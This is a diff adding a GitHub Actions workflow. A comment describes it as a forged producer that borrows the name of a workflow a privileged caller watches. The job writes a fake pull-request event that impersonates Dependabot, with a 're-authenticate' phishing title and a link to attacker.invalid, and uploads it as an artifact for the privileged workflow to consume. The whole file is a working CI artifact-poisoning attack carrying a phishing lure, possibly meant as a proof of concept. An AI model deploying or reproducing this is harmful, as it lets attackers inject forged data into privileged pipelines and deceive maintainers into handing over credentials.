@@ -1,0 +1,26 @@
+name: Gardener - Notify Event
+# Forged producer: same `name:` as the workflow the privileged
+# caller watches for. Runs from the PR head with no privileges.
+on: pull_request
+
+permissions:
+  contents: read
+
+jobs:
+  capture:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Forge the event payload
+        run: |
+          cat > event.json <<'JSON'
+          {"action":"opened",
+           "pull_request":{"number":1,
+             "user":{"login":"dependabot[bot]"},
+             "title":"Action required: re-authenticate to keep Dependabot alerts",
+             "html_url":"https://attacker.invalid/dependabot-login"}}
+          JSON
+      - uses: actions/upload-artifact@v4
+        with:
+          name: gardener-event
+          path: event.json
+          retention-days: 1
